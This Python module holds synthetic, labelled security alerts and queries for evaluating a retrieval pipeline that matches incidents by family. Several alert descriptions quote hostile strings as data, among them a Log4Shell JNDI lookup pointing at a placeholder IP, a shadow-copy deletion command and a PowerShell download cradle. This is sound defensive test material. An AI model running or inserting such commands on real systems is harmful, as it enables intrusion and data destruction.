"""Synthetic labelled alerts for evaluating retrieval. NOT real customer data and small by design.

Each family is one kind of incident. A historical alert is relevant to a query alert iff they share a family.
Queries deliberately mix: shared indicators (exact-friendly), paraphrases with no shared indicator or wording
(semantic-friendly), and families with no history (the correct answer is "nothing relevant").
"""

# family -> list of (title, description, days_ago, human decision or None, analyst note)
HISTORY: dict[str, list[tuple[str, str, int, str | None, str]]] = {
    "log4shell": [
        ("Exploit attempt against Log4j JNDI lookup", "WAF blocked ${jndi:ldap://198.51.100.7/a} in User-Agent against web01. CVE-2021-44228 pattern.", 20, "true_positive", "Scanner from botnet, patched host."),
        ("Suspicious LDAP callback from Java application server", "app02 made an outbound LDAP connection to 203.0.113.50 right after a crafted HTTP header was received.", 40, "true_positive", "Confirmed Log4Shell probe."),
        ("Remote code execution probe via logging library", "Web logs contain jndi:rmi payload strings in request headers sent to the customer portal.", 90, "false_positive", "Internal vuln scanner."),
        ("Java process spawned shell after HTTP request", "tomcat user launched /bin/sh from the java process on app03; request contained a JNDI expression.", 10, None, ""),
    ],
    "ransomware": [
        ("Mass file rename with .locked extension", "fileserver01 saw 4,000 files renamed to .locked within two minutes by a single process.", 15, "true_positive", "Ransomware. Host isolated."),
        ("Shadow copy deletion via vssadmin", "vssadmin delete shadows /all /quiet executed by a non-admin service account on hr-laptop-7.", 30, "true_positive", "Part of the same intrusion."),
        ("Ransom note dropped in multiple folders", "README_RESTORE.txt created in hundreds of share directories; text demands cryptocurrency payment.", 50, "true_positive", "Confirmed."),
        ("Backup agent stopped unexpectedly", "The nightly backup service on db02 was stopped and its catalog deleted, then high disk write activity began.", 25, None, ""),
    ],
    "rdp_bruteforce": [
        ("Multiple failed RDP logins from external IP", "203.0.113.99 caused 380 failed logons (event 4625) against jump-host over ten minutes.", 12, "true_positive", "Blocked at firewall by network team."),
        ("Password spraying against remote desktop gateway", "One source tried the same weak passwords across 60 accounts on rdgw01; two lockouts.", 33, "true_positive", "Spray confirmed, passwords reset."),
        ("Successful RDP login after many failures", "Account svc-backup logged in over RDP following 200 failures from an unfamiliar country.", 60, "needs_further_review", "Could not confirm travel."),
        ("Repeated authentication failures on terminal server", "ts-farm-3 recorded burst of failed network logons from a single remote address.", 8, "false_positive", "Misconfigured monitoring probe."),
    ],
    "phishing": [
        ("User reported suspicious invoice email", "Employee received email with an attached invoice.xlsm macro document from an unknown sender requesting urgent payment.", 18, "true_positive", "Credential-harvesting macro."),
        ("Credential entry on lookalike login page", "Proxy logs show a user submitted a password to micr0soft-login.example-secure.top after clicking a mailed link.", 28, "true_positive", "Reset user credentials."),
        ("Mailbox rule forwarding to external address", "A new inbox rule silently forwards all mail to an outside webmail address after a suspicious sign-in.", 45, "true_positive", "Account takeover after phishing."),
        ("Marketing newsletter flagged as phishing", "Bulk email from a known vendor was flagged by the mail gateway for tracking links.", 70, "false_positive", "Legitimate vendor."),
    ],
    "c2_beacon": [
        ("Periodic outbound connections every 60 seconds", "ws-114 contacts 198.51.100.23 over HTTPS at exact 60 second intervals with identical small payloads.", 22, "true_positive", "Cobalt Strike beacon."),
        ("DNS requests to algorithmically generated domains", "Host made hundreds of lookups for random-looking domains ending in .top within an hour; most returned NXDOMAIN.", 36, "true_positive", "DGA malware."),
        ("Unusual long-lived connection to rare IP", "laptop-22 held a 9 hour TLS session to a never before seen address on port 8443.", 55, "needs_further_review", "Possibly a VPN."),
        ("Beacon-like traffic from server", "Application server shows regular heartbeat style traffic to an external endpoint not in the allow list.", 14, None, ""),
    ],
    "powershell": [
        ("Encoded PowerShell command line", "powershell.exe -enc JABzAD0ATgBlAHcA... launched by winword.exe on finance-pc-3.", 11, "true_positive", "Macro dropper."),
        ("PowerShell download cradle", "IEX (New-Object Net.WebClient).DownloadString from a paste site executed by a scheduled task on build-agent-2.", 26, "true_positive", "Persistence installed."),
        ("Obfuscated script block logged", "ScriptBlock logging recorded heavily obfuscated string concatenation and Invoke-Expression on dev-vm-9.", 41, "false_positive", "Admin tooling, whitelisted."),
        ("AMSI bypass attempt detected", "A process attempted to patch amsi.dll in memory before running a script on kiosk-12.", 19, "true_positive", "Red team exercise confirmed by SOC lead."),
    ],
    "exfiltration": [
        ("Large upload to personal cloud storage", "user jdoe uploaded 12 GB to an unsanctioned file sharing site over several hours after resignation notice.", 17, "true_positive", "Insider data theft."),
        ("Archive created then sent over FTP", "A 3 GB password-protected zip was staged on db-backup and transferred to an external FTP server.", 38, "true_positive", "Confirmed exfiltration."),
        ("Unusual DNS tunnelling volume", "Very long TXT queries to a single domain from fin-srv-1 suggest data encoded in DNS.", 64, "needs_further_review", "Inconclusive."),
        ("Bulk database export by service account", "svc-report exported the full customers table outside the normal reporting window.", 9, None, ""),
    ],
    "cloud_keys": [
        ("Access key used from unfamiliar region", "An IAM access key for ci-deploy was used from a country never seen before, listing S3 buckets.", 13, "true_positive", "Key leaked in public repo, rotated."),
        ("New IAM user and admin policy created", "A principal created a new user and attached AdministratorAccess outside the change window.", 31, "true_positive", "Compromised key."),
        ("Public S3 bucket policy change", "A bucket policy was changed to allow public read on a bucket containing exports.", 47, "false_positive", "Approved marketing site bucket."),
        ("CloudTrail logging disabled", "StopLogging was called on the organization trail by an unfamiliar role.", 21, "true_positive", "Attacker covering tracks."),
    ],
}

# Noise: benign/unrelated history that should never be retrieved for the queries below.
NOISE = [
    ("Scheduled vulnerability scan completed", "Weekly authenticated scan of the server estate finished; findings exported.", 5, "false_positive", "Routine."),
    ("Certificate expiring in 14 days", "TLS certificate for the intranet portal expires soon and needs renewal.", 6, "false_positive", "Ticket opened."),
    ("Disk usage above 90 percent", "Log volume on syslog01 is nearly full.", 7, "false_positive", "Housekeeping."),
    ("New employee device enrolled", "A laptop was enrolled in device management for a new starter.", 3, "false_positive", "HR onboarding."),
    ("Printer firmware update available", "Several network printers have pending firmware updates.", 90, "false_positive", "Low priority."),
]

# Old case that is relevant by family but stale (> 365 days); the pipeline should drop it unless an indicator matches.
STALE = ("Old RDP brute force from external source", "198.51.100.200 failed hundreds of RDP logons against legacy-ts.", 800, "true_positive", "Historic.")
STALE_FAMILY = "rdp_bruteforce"

# (query title, description, family or None, note on what is being tested)
QUERIES: list[tuple[str, str, str | None, str]] = [
    ("Log4j exploit string seen in request", "Reverse proxy logged a jndi:ldap request pointing at 198.51.100.7 against the shop front end.", "log4shell", "shared IP + CVE-like wording"),
    ("Possible logging library RCE attempt", "Application logs show attacker-controlled header values that trigger remote class loading in a Java service.", "log4shell", "paraphrase, no shared indicator"),
    ("Files being encrypted on shared drive", "Hundreds of documents on the finance share suddenly became unreadable and carry a new unfamiliar extension.", "ransomware", "paraphrase"),
    ("Windows restore points wiped", "Command to remove volume snapshots silently ran from a low-privilege account on a workstation.", "ransomware", "paraphrase"),
    ("Brute force against remote desktop", "203.0.113.99 is hammering the VPN-less RDP host with failed logons again.", "rdp_bruteforce", "shared IP"),
    ("Many bad logins across accounts on gateway", "A single remote address attempts a handful of common passwords for dozens of user names on the access gateway.", "rdp_bruteforce", "paraphrase + stale item present"),
    ("Employee clicked link in invoice email", "A staff member opened a macro enabled spreadsheet attached to an unexpected payment request and then entered a password.", "phishing", "paraphrase"),
    ("Beaconing to 198.51.100.23", "Workstation ws-130 connects to 198.51.100.23 on a fixed schedule.", "c2_beacon", "shared IP"),
    ("Office app launched hidden shell with base64", "winword started powershell with a long base64 argument on sales-pc-8.", "powershell", "close wording"),
    ("Employee copying data to personal storage", "Large volume of internal documents sent to a consumer file sharing website by a departing user.", "exfiltration", "paraphrase"),
    ("Credentials for deploy pipeline used abroad", "A programmatic cloud credential belonging to automation authenticated from an unexpected geography.", "cloud_keys", "paraphrase"),
    ("Brand new alert type: badge reader offline", "The door controller on floor 3 lost connectivity to the access control server.", None, "no relevant history: should retrieve nothing"),
]
